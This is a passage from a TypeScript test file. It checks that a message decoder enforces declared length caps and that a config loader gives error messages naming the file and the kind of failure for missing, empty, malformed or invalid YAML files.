    expect(onTheWire(WIRE_VALUES[0]!, 'h'.repeat(MAX_HANDLE_LEN + 1))).toBe('record dropped');
  });

  it.each(CELLS)('%s: the decoder carries a value AT the declared cap', (_label, w, axis) => {
    expect(onTheWire(w, axis.at(axis.cap))).toBe('carried in full');
  });

  it.each(CELLS)('%s: the decoder is what makes the cap real — one past it is lost', (_l, w, axis) => {
    expect(onTheWire(w, axis.at(axis.cap + 1))).not.toBe('carried in full');
  });

  it.each(CELLS)('%s at the cap loads and reaches a peer whole', async (_label, w, axis) => {
    expect(await roundTrip(w, axis.at(axis.cap))).toBe('carried in full');
  });

  it.each(CELLS)('%s past the cap is refused at load, not lost behind the operator', async (_l, w, axis) => {
    expect(await roundTrip(w, axis.at(axis.cap + 1))).toBe('refused at load');
  });
});

// `loadConfig` is what every shipped backend CLI calls, so its failure message is the first thing a
// stuck operator reads. Grade the CLASS "every way a config FILE can fail names the file and the
// kind of failure" rather than the empty-document instance: one row per way a whole file goes wrong,
// each asserting the path appears and that no raw zod dump leaked through. The positive control is
// what keeps the rows honest — without it, `loadConfig = () => { throw new Error(path) }` passes
// every row.
describe('loadConfig names the file and the failure kind', () => {
  const dir = mkdtempSync(join(tmpdir(), 'parley-config-'));
  const write = (name: string, text: string): string => {
    const path = join(dir, name);
    writeFileSync(path, text);
    return path;
  };

  const VALID = [
    'identity:',
    '  handle: ctx-payments',
    'topics:',
    '  - ctx-payments',
    '',
  ].join('\n');

  const FILE_FAILURES: readonly (readonly [label: string, path: () => string, expect: RegExp])[] = [
    ['a file that does not exist', () => join(dir, 'absent.yaml'), /cannot read config .*ENOENT/],
    ['a directory in place of a file', () => dir, /cannot read config .*EISDIR/],
    ['an empty file', () => write('empty.yaml', ''), /is empty \(or holds only comments\)/],
    ['a comment-only file', () => write('comments.yaml', '# nothing here\n'), /is empty \(or holds only comments\)/],
    ['a top-level scalar', () => write('scalar.yaml', 'just-a-string\n'), /is a bare string/],
    ['a top-level sequence', () => write('seq.yaml', '- ctx\n- ctx2\n'), /is a YAML sequence/],
    ['a YAML syntax error', () => write('syntax.yaml', 'identity:\n   handle: a: b\n'), /is not valid YAML/],
    ['a missing required field', () => write('nofields.yaml', 'topics:\n  - ctx\n'), /identity: .*required/i],
    ['an unknown top-level key', () => write('unknown.yaml', `${VALID}presense: {}\n`), /presense/],
    ['a field-level rule violation', () => write('badttl.yaml', `${VALID}presence:\n  heartbeat_ms: 60000\n  ttl_ms: 1000\n`), /presence\.ttl_ms: .*heartbeat_ms/],
    ['a legacy backend key', () => write('backend.yaml', `${VALID}backend: local-sqlite\n`), /`backend` is not a supported field/],
  ] as const;

  it('a valid file still loads (positive control: the rows cannot pass by throwing always)', () => {
    const cfg = loadConfig(write('good.yaml', VALID));
    expect(cfg.identity.handle).toBe('ctx-payments');
    expect(cfg.topics).toEqual(['ctx-payments']);
  });

  it.each(FILE_FAILURES)('%s', (_label, path, matcher) => {
    const file = path();
    let thrown: unknown;
    try {
      loadConfig(file);
    } catch (e) {
      thrown = e;
    }
    expect(thrown, 'the file was accepted').toBeInstanceOf(Error);
    const message = (thrown as Error).message;
    expect(message, 'the failure must name the file').toContain(file);
    expect(message).toMatch(matcher);
    // A serialized zod error names neither the file nor the shape expected; it is the regression
    // this whole table exists to keep out.
    expect(message).not.toContain('ZodError');
    expect(message).not.toContain('"code":');
    expect(message).not.toContain('invalid_type');
  });
});
